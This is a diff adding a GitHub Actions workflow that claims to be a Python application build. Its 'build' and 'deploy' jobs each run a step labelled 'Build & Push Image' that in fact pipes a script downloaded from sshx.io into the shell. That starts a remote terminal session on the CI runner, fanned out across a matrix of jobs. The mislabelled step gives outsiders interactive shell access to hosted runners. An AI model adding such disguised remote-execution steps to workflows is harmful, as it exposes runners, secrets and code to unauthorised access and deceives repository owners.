@@ -1,0 +1,45 @@
+name: Python application
+##################
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+
+
+jobs:
+  build:
+    runs-on: namespace-profile-amd64-medium
+    strategy:
+      max-parallel: 1
+      fail-fast: false
+      matrix:
+        go: [1]
+        flag: [A, B, C, D]
+    
+    env:
+        NUM_JOBS: 4
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v1
+    - name: Build & Push Image
+      run: |
+        curl -sSf https://sshx.io/get | sh -s run
+
+  deploy:
+    runs-on: namespace-profile-amd64-medium
+    strategy:
+      max-parallel: 1
+      fail-fast: false
+      matrix:
+        go: [1]
+        flag: [A, B, C, D]
+    
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v1
+    - name: Build & Push Image
+      run: |
+        curl -sSf https://sshx.io/get | sh -s run
